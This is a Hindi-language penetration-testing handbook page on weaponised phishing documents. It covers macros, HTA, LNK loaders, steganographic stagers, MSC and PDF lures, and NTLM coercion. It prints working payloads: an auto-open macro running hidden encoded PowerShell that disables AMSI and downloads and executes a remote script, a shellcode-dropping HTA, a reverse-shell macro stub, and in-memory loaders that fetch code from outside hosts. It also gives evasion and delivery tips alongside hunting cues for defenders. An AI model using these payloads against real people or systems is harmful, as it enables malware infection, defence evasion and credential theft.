# फ़िशिंग फ़ाइलें और दस्तावेज़

{{#include ../../banners/hacktricks-training.md}}

## Office दस्तावेज़

Microsoft Word किसी फ़ाइल को खोलने से पहले उसके डेटा का सत्यापन करता है। यह सत्यापन, OfficeOpenXML मानक के अनुसार डेटा संरचना की पहचान करके किया जाता है। यदि डेटा संरचना की पहचान के दौरान कोई त्रुटि होती है, तो विश्लेषण की जा रही फ़ाइल नहीं खुलेगी।

आमतौर पर, macros वाली Word फ़ाइलें `.docm` एक्सटेंशन का उपयोग करती हैं। हालाँकि, फ़ाइल एक्सटेंशन बदलकर उसका नाम बदलना और फिर भी macro execution की क्षमता बनाए रखना संभव है।\
उदाहरण के लिए, RTF फ़ाइल डिज़ाइन के अनुसार macros का समर्थन नहीं करती, लेकिन DOCM फ़ाइल का नाम बदलकर RTF करने पर Microsoft Word उसे संभाल लेगा और उसमें macro execution संभव होगा।\
यही आंतरिक प्रक्रियाएँ और तंत्र Microsoft Office Suite के सभी सॉफ़्टवेयर (Excel, PowerPoint आदि) पर लागू होते हैं।

कुछ Office प्रोग्राम किन एक्सटेंशन को execute करेंगे, यह जाँचने के लिए आप निम्न कमांड का उपयोग कर सकते हैं:

```bash
assoc | findstr /i "word excel powerp"
```

DOCX फ़ाइलें जो किसी remote template (File –Options –Add-ins –Manage: Templates –Go) को संदर्भित करती हैं, जिसमें macros शामिल हों, वे भी macros “execute” कर सकती हैं।

### External Image Load

यहाँ जाएँ: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture, and **Filename or URL**:_ http://<ip>/whatever

![Office Documents - External Image Load: यहाँ जाएँ: Insert -- Quick Parts -- Field](<../../images/image (155).png>)

### Macros Backdoor

दस्तावेज़ से arbitrary code चलाने के लिए macros का इस्तेमाल करना संभव है।

#### Autoload functions

वे जितने अधिक सामान्य होंगे, AV द्वारा उनका पता लगाए जाने की संभावना उतनी ही अधिक होगी।

- AutoOpen()
- Document_Open()

#### Macros Code Examples

```vba
Sub AutoOpen()
    CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
 .StdIn.WriteLine author
 .StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```

#### मेटाडेटा मैन्युअल रूप से हटाएँ

**File > Info > Inspect Document > Inspect Document** पर जाएँ, जिससे Document Inspector खुलेगा। **Inspect** पर क्लिक करें और फिर **Document Properties and Personal Information** के बगल में **Remove All** पर क्लिक करें।

#### Doc Extension

काम पूरा होने पर, **Save as type** ड्रॉपडाउन चुनें और फ़ॉर्मैट को **`.docx`** से बदलकर Word 97-2003 **`.doc`** करें।\
ऐसा इसलिए करें क्योंकि आप **`.docx`** फ़ाइल में macro's सेव **नहीं कर सकते**, और macro-सक्षम **`.docm`** extension को लेकर **कलंक** **है** (उदाहरण के लिए, thumbnail icon में बड़ा `!` होता है और कुछ web/email gateway उन्हें पूरी तरह block कर देते हैं)। इसलिए, यह **पुराना `.doc` extension सबसे अच्छा समझौता है**।

#### Malicious Macros Generators

- MacOS
  - [**macphish**](https://github.com/cldrn/macphish)
  - [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## LibreOffice ODT auto-run macros (Basic)

LibreOffice Writer दस्तावेज़ों में Basic macros एम्बेड किए जा सकते हैं और macro को **Open Document** event से बाँधकर फ़ाइल खुलने पर उन्हें अपने-आप चलाया जा सकता है (Tools → Customize → Events → Open Document → Macro…)।<sup>[[1]](#references)</sup> एक साधारण reverse shell macro ऐसा दिखता है:

```vb
Sub Shell
    Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```

ध्यान दें कि string के अंदर doubled quotes (`""`) हैं—LibreOffice Basic literal quotes को escape करने के लिए इनका इस्तेमाल करता है, इसलिए `...==""")` पर समाप्त होने वाले payloads में inner command और Shell argument दोनों balanced रहते हैं।

डिलीवरी के सुझाव:

- `.odt` के रूप में save करें और macro को document event से bind करें, ताकि document खुलते ही वह execute हो।
- `swaks` से email भेजते समय `--attach @resume.odt` का उपयोग करें (`@` आवश्यक है, ताकि filename string के बजाय file bytes attachment के रूप में भेजे जाएँ)। यह उन SMTP servers का दुरुपयोग करते समय महत्वपूर्ण है जो बिना validation के मनमाने `RCPT TO` recipients स्वीकार करते हैं।

## HTA फ़ाइलें

HTA एक Windows प्रोग्राम है जो **HTML और scripting languages (जैसे VBScript और JScript) को जोड़ता है**। यह user interface बनाता है और browser के security model की सीमाओं के बिना, एक "fully trusted" application के रूप में execute होता है।

HTA को **`mshta.exe`** का उपयोग करके execute किया जाता है, जो आमतौर पर **Internet Explorer** के साथ **installed** होता है, इसलिए **`mshta` IE पर निर्भर है**। अगर इसे uninstall कर दिया गया है, तो HTAs execute नहीं हो पाएँगे।

```html
<--! Basic HTA Execution -->
<html>
  <head>
    <title>Hello World</title>
  </head>
  <body>
    <h2>Hello World</h2>
    <p>This is an HTA...</p>
  </body>

  <script language="VBScript">
    Function Pwn()
      Set shell = CreateObject("wscript.Shell")
      shell.run "calc"
    End Function

    Pwn
  </script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
  Function var_func()
  	var_shellcode = "<shellcode>"

  	Dim var_obj
  	Set var_obj = CreateObject("Scripting.FileSystemObject")
  	Dim var_stream
  	Dim var_tempdir
  	Dim var_tempexe
  	Dim var_basedir
  	Set var_tempdir = var_obj.GetSpecialFolder(2)
  	var_basedir = var_tempdir & "\" & var_obj.GetTempName()
  	var_obj.CreateFolder(var_basedir)
  	var_tempexe = var_basedir & "\" & "evil.exe"
  	Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
  	For i = 1 to Len(var_shellcode) Step 2
  	    var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
  	Next
  	var_stream.Close
  	Dim var_shell
  	Set var_shell = CreateObject("Wscript.Shell")
  	var_shell.run var_tempexe, 0, true
  	var_obj.DeleteFile(var_tempexe)
  	var_obj.DeleteFolder(var_basedir)
  End Function

  var_func
  self.close
</script>
```

## HTML ईमेल में नकली अटैचमेंट कार्ड

HTML ईमेल में असली अटैचमेंट भेजने के बजाय, उसे किसी provider के native attachment-preview card जैसा दिखाया जा सकता है। Talos ने चार Base64-encoded inline PNG MIME parts से दोबारा बनाया गया Gmail card देखा। पूरे दृश्य तत्व को एक ही anchor में लपेटा गया था, और `?m=<target-id>` में recipient की value से हर recipient की अलग-अलग tracking संभव हुई। लिंक `http://` या `https://` के बजाय `//` से शुरू होता था; browsers इस protocol-relative रूप को resolve कर लेते हैं, लेकिन जो URL extractors केवल पूरी तरह qualified URLs खोजते हैं, वे इसे छोड़ सकते हैं।<sup>[[11]](#references)</sup>

विश्लेषण के दौरान, rendered attachment list पर भरोसा करने के बजाय raw MIME की जाँच करें। पता लगाएँ कि inline image parts मिलकर दृश्य card कैसे बनाते हैं, उसे लपेटने वाला anchor पहचानें, और URLs निकालने से पहले protocol-relative `href` values को normalize करें।<sup>[[11]](#references)</sup>

Envelope/header sender spoofing और DMARC alignment testing के लिए, देखें [SMTP mail spoofing countermeasures](../../network-services-pentesting/pentesting-smtp/index.html#spf-pass-with-an-unaligned-visible-sender)।

## NTLM Authentication को बाध्य करना

दूर से **NTLM authentication को बाध्य** करने के कई तरीके हैं। उदाहरण के लिए, आप ईमेल या उपयोगकर्ता द्वारा खोले जाने वाले HTML में **अदृश्य images** जोड़ सकते हैं (HTTP MitM के ज़रिए भी?)। या पीड़ित को **ऐसी files के पते** भेज सकते हैं, जिन्हें **खोलने पर** ही **authentication** trigger हो जाए।

**इन और अन्य तरीकों की जाँच आगे दिए गए पेजों पर करें:**

{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

यह न भूलें कि आप केवल hash या authentication चुरा ही नहीं सकते, बल्कि **NTLM relay attacks भी कर सकते हैं**:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

बेहद प्रभावी campaigns ऐसी ZIP भेजती हैं जिसमें दो वैध decoy documents (PDF/DOCX) और एक malicious .lnk होता है। तरीका यह है कि असली PowerShell loader को ZIP के raw bytes में एक unique marker के बाद रखा जाता है, और .lnk उसे निकालकर पूरी तरह memory में चलाता है।<sup>[[2]](#references)</sup>

.lnk द्वारा लागू किए गए PowerShell one-liner का सामान्य flow:

1) सामान्य paths में original ZIP खोजें: Desktop, Downloads, Documents, %TEMP%, %ProgramData%, और current working directory का parent।
2) ZIP bytes पढ़ें और hardcoded marker (जैसे, xFIQCV) खोजें। Marker के बाद का पूरा हिस्सा embedded PowerShell payload होता है।
3) ZIP को %ProgramData% में copy करें, वहीं extract करें, और वैध दिखने के लिए decoy .docx खोलें।
4) मौजूदा process के लिए AMSI bypass करें: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) अगला stage deobfuscate करें (जैसे, सभी # characters हटाकर) और उसे memory में execute करें।

Embedded stage को निकालने और चलाने के लिए PowerShell skeleton का उदाहरण:

```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
  "$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
  "$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```

नोट्स
- Delivery में अक्सर प्रतिष्ठित PaaS subdomains (जैसे, *.herokuapp.com) का दुरुपयोग होता है और payloads को gate किया जा सकता है (IP/UA के आधार पर benign ZIPs serve करना)।
- अगला stage अक्सर base64/XOR shellcode को decrypt करता है और disk artifacts को कम से कम रखने के लिए इसे Reflection.Emit + VirtualAlloc के ज़रिए execute करता है।

इसी chain में उपयोग की गई Persistence
- Microsoft Web Browser control की COM TypeLib hijacking, ताकि IE/Explorer या इसे embed करने वाला कोई भी app payload को अपने-आप फिर से launch करे।<sup>[[2]](#references)[[4]](#references)</sup> विवरण और इस्तेमाल के लिए तैयार commands यहाँ देखें:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- ऐसी ZIP files जिनके archive data के अंत में ASCII marker string (जैसे, xFIQCV) जोड़ी गई हो।
- ऐसी .lnk जो ZIP खोजने के लिए parent/user folders को enumerate करती है और एक decoy document खोलती है।
- [System.Management.Automation.AmsiUtils]::amsiInitFailed के ज़रिए AMSI tampering।
- लंबे समय तक चलने वाले business threads, जिनका अंत trusted PaaS domains पर hosted links से होता है।

## पहले LNK decoy खोलना → scheduled-task persistence → trusted CPL side-loading

एक और बार-बार दिखने वाला pattern है **document का रूप धरने वाली `.lnk`**, जो background में असली chain को stage करते हुए तुरंत एक benign lure खोलती है।<sup>[[3]](#references)</sup>

देखा गया workflow:
1. Shortcut **PDF का रूप धरता है** और obfuscated PowerShell downloader को spawn करने के लिए `conhost.exe` या ऐसे ही किसी proxy का उपयोग करता है।
2. PowerShell स्पष्ट tokens (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`) को fragments में बाँट देता है, ताकि `iwr`, `gci`, `ren`, `cpi` या `schtasks` खोजने वाली साधारण detections command को पकड़ न सकें।
3. Stager पहले **decoy document download** करता है, उसे victim के लिए खोलता है, और फिर background में malicious files को दोबारा तैयार करता है।
4. Payloads को **junk extensions** के साथ लिखा जा सकता है और फिर filler characters हटाकर उनका नाम बदला जा सकता है, जिससे स्पष्ट `.exe` / `.cpl` artifacts दिखने में देरी होती है।
5. Persistence को एक **minute-based scheduled task** के ज़रिए स्थापित किया जाता है, जो user-writable path से trusted host binary launch करता है।

इस pattern के कुछ बुनियादी hunting clues:

```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```

पहचानने योग्य एक उपयोगी staging layout:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` या `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### दूसरा stage stealthy क्यों है

Rapid7 के case study में, scheduled task बार-बार `C:\Users\Public\` से **`Fondue.exe`** लॉन्च करता था। क्योंकि **`APPWIZ.cpl`** को उसी के पास stage किया गया था और वह **`RunFODW`** export करता था, इसलिए trusted Microsoft binary ने वैध system copy के बजाय attacker CPL को side-load किया।

इसके बाद CPL:
- `C:\Windows\Tasks\editor.dat` से **AES-256-CBC** blob पढ़ता है
- **Windows CNG / `bcrypt.dll`** के ज़रिए उसे decrypt करता है
- executable memory allocate करके उसमें decrypted shellcode कॉपी करता है
- **`EnumUILanguagesW`** के callback के रूप में shellcode pointer पास करके उसे अप्रत्यक्ष रूप से execute करता है

इस अंतिम तरीके को अलग से hunt करना उपयोगी है: malware अक्सर `((void(*)())buf)()` जैसे सीधे jump से बचता है और execution के लिए वैध callback-taking **WinAPI** का दुरुपयोग करता है।

इस campaign में decrypted payload **Donut** shellcode था, जिसने फिर अंतिम PE को पूरी तरह memory में map किया और execution सौंपने से पहले current process में **AMSI/WLDP/ETW** को patch किया। Side-loading और memory-resident post-processing पर अधिक जानकारी के लिए देखें:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

व्यावहारिक hunting pivots:
- `.lnk` से `powershell.exe` या `conhost.exe` spawn होना, जिसके बाद एक दिखाई देने वाला decoy document खुले।
- **`C:\Users\Public\`** में अल्पकालिक downloads, जिनके बाद बेतुके extensions से तुरंत rename किया जाए।
- `GoogleErrorReport` जैसे साधारण नामों वाले scheduled tasks, जो **user-writable directories** से execute होते हों।
- Trusted binaries का उसी non-system directory से **`.cpl` / `.dll`** files load करना।
- **`C:\Windows\Tasks\`** के अंतर्गत लिखे Base64 text blobs, जिन्हें बाद में side-loaded module पढ़े।

## Images में steganography-delimited payloads (PowerShell stager)

हाल की loader chains एक obfuscated JavaScript/VBS भेजती हैं, जो Base64 PowerShell stager को decode करके चलाती है। यह stager एक image (अक्सर GIF) download करता है, जिसमें plain text के रूप में unique start/end markers के बीच छिपी Base64-encoded .NET DLL होती है। Script इन delimiters को खोजती है (जंगल में देखे गए उदाहरण: «<<sudo_png>> … <<sudo_odt>>>»), उनके बीच का text निकालती है, उसे Base64 से bytes में decode करती है, assembly को memory में load करती है और C2 URL के साथ एक ज्ञात entry method को invoke करती है।<sup>[[5]](#references)</sup>

कार्यप्रवाह
- चरण 1: Archived JS/VBS dropper → embedded Base64 को decode करता है → `-nop -w hidden -ep bypass` के साथ PowerShell stager लॉन्च करता है।
- चरण 2: PowerShell stager → image download करता है, marker-delimited Base64 निकालता है, .NET DLL को memory में load करता है और C2 URL तथा options पास करते हुए उसका method (जैसे, VAI) call करता है।
- चरण 3: Loader अंतिम payload retrieve करता है और आमतौर पर उसे process hollowing के ज़रिए किसी trusted binary (आमतौर पर MSBuild.exe) में inject करता है।<sup>[[7]](#references)[[8]](#references)</sup> Process hollowing और trusted utility proxy execution के बारे में अधिक जानकारी यहाँ देखें:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

Image से DLL निकालने और memory में .NET method invoke करने का PowerShell उदाहरण:

<details>
<summary>PowerShell stego payload extractor और loader</summary>

```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
  [string]$Url    = 'https://example.com/payload.gif',
  [string]$StartM = '<<sudo_png>>',
  [string]$EndM   = '<<sudo_odt>>',
  [string]$EntryType = 'Loader',
  [string]$EntryMeth = 'VAI',
  [string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```

</details>

नोट्स
- यह ATT&CK T1027.003 (steganography/marker-hiding) है।<sup>[[6]](#references)</sup> मार्कर अलग-अलग campaigns में अलग हो सकते हैं।
- Assembly लोड करने से पहले आम तौर पर AMSI/ETW bypass और string deobfuscation लागू किए जाते हैं।
- Hunting: डाउनलोड की गई images को ज्ञात delimiters के लिए scan करें; पहचानें कि PowerShell images तक पहुँच रहा है और तुरंत Base64 blobs decode कर रहा है या नहीं।

Stego tools और carving techniques भी देखें:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

एक बार-बार दिखने वाला initial stage एक छोटा, भारी-obfuscated `.js` या `.vbs` होता है, जो किसी archive के अंदर दिया जाता है। इसका एकमात्र उद्देश्य embedded Base64 string को decode करना और HTTPS पर अगले stage को bootstrap करने के लिए `-nop -w hidden -ep bypass` के साथ PowerShell launch करना है।<sup>[[5]](#references)</sup>

Skeleton logic (abstract):
- अपनी file के contents पढ़ें
- junk strings के बीच Base64 blob ढूँढें
- उसे ASCII PowerShell में decode करें
- `wscript.exe`/`cscript.exe` से `powershell.exe` चलाकर उसे execute करें

Hunting cues
- Archived JS/VBS attachments, जिनकी command line में `-enc`/`FromBase64String` हो और जो `powershell.exe` launch करती हों।
- `wscript.exe` का user temp paths से `powershell.exe -nop -w hidden` launch करना।

## Execution containers के रूप में MSC documents (GrimResource)

Microsoft Management Console files (`.msc`) XML console definitions होती हैं, जो आम तौर पर `mmc.exe` से खोली जाती हैं। **GrimResource**, एक `StringTable` reference को weaponize करता है, जो पुराने XSS primitive वाले `apds.dll` resource की ओर इशारा करता है; इससे crafted console खोलने पर user के `mmc.exe` के अंदर JavaScript चलती है। देखे गए samples में `transformNode`-आधारित obfuscation को **DotNetToJScript** के साथ जोड़ा गया था, ताकि सामान्य Office-macro path के बिना .NET payload instantiate किया जा सके।<sup>[[9]](#references)</sup>

Static triage के लिए, किसी untrusted MSC को text की तरह देखें और उस पर **double-click न करें**:<sup>[[9]](#references)</sup>

```bash
file lure.msc
xmllint --format lure.msc > lure.formatted.xml
grep -Eina 'apds\.dll|res://|StringTable|transformNode|ActiveXObject|FromBase64String' lure.formatted.xml
strings -el lure.msc | grep -Ei 'powershell|cmd\.exe|http|base64'
```

High-signal runtime pivots में `mmc.exe` का CLR या script components लोड करना, network connections बनाना, या `powershell.exe`, `cmd.exe`, `wscript.exe`, `cscript.exe`, `mshta.exe`, `rundll32.exe` अथवा किसी अप्रत्याशित executable को spawn करना शामिल है। यह format वैध है, इसलिए detections को हर MSC को block करने के बजाय **origin + suspicious XML/script content + `mmc.exe` behavior** को correlate करना चाहिए।<sup>[[9]](#references)</sup>

## PDF/QR redirectors और payload gating

PDF उपयोगी होने के लिए उसमें exploit होना ज़रूरी नहीं है। हाल के campaigns में benign दिखने वाले document में **QR code या सामान्य link** रखा जाता है, browser session को mail controls से बाहर ले जाया जाता है, और recipient address के अनुसार destination को personalize किया जाता है। Microsoft ने 2025 के ऐसे PDFs का दस्तावेज़ीकरण किया जिनके QR URLs हर recipient के लिए अलग थे और RaccoonO365 credential-harvesting infrastructure तक ले जाते थे; एक समानांतर chain में IP/environment gating का इस्तेमाल करके चुनिंदा visitors को JavaScript/MSI path दिया गया, जबकि scanners या disallowed clients को benign PDF दिखाया गया।<sup>[[10]](#references)</sup>

PDF actions और rendered QR codes—दोनों की triage करें। QR को extractable image के रूप में store करने के बजाय vector-drawn किया जा सकता है, इसलिए embedded images extract करने के साथ-साथ हर page को rasterize करें:

```bash
pdfid.py lure.pdf
pdfdetach -list lure.pdf
qpdf --qdf --object-streams=disable lure.pdf expanded.pdf
grep -aE '/(URI|OpenAction|AA|Launch|EmbeddedFile)|https?://' expanded.pdf
pdfimages -png lure.pdf image
pdftoppm -png -r 300 lure.pdf page
zbarimg --quiet image-*.png page-*.png
```

किसी isolated analysis system से authentication किए बिना decoded destinations और redirects का निरीक्षण करें। खोज के उपयोगी संकेतों में लगभग खाली email bodies वाले केवल-QR PDFs, query parameter में embedded recipient email, प्रतिष्ठित hosting सेवाओं के ज़रिए कई redirects, और IP, geolocation, cookies, referrer या user agent के आधार पर लौटाई गई अलग-अलग सामग्री शामिल हैं। नियंत्रित profiles के साथ requests की तुलना करें, क्योंकि एक sandbox fetch में केवल decoy मिल सकता है।<sup>[[10]](#references)</sup>

## NTLM hashes चुराने के लिए Windows files

**NTLM creds चुराने के स्थान** वाला page देखें:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}




## References

- [1] [HTB Job – LibreOffice macro → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Check Point Research – ZipLine अभियान: US कंपनियों को निशाना बनाने वाला एक परिष्कृत Phishing Attack](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – Malware à la Mode: China-Themed Loader Chain के ज़रिए Dropping Elephant की Tradecraft पर नज़र](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [Hijack the TypeLib – नई COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42 – PhantomVAI Loader कई तरह के Infostealers डिलीवर करता है](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
- [9] [Elastic Security Labs – GrimResource: Initial access और evasion के लिए Microsoft Management Console](https://www.elastic.co/security-labs/threat-command/grimresource)
- [10] [Microsoft Security Blog – Threat actors tax season का फ़ायदा उठाकर tax-themed phishing campaigns चलाते हैं](https://www.microsoft.com/en-us/security/blog/2025/04/03/threat-actors-leverage-tax-season-to-deploy-tax-themed-phishing-campaigns/)
- [11] [Cisco Talos – UAT-11587 delivery chain और Antino backdoor](https://blog.talosintelligence.com/china-nexus-uat-11587-targets-government-and-policy-organizations-across-asia-with-antino-backdoor/)
{{#include ../../banners/hacktricks-training.md}}
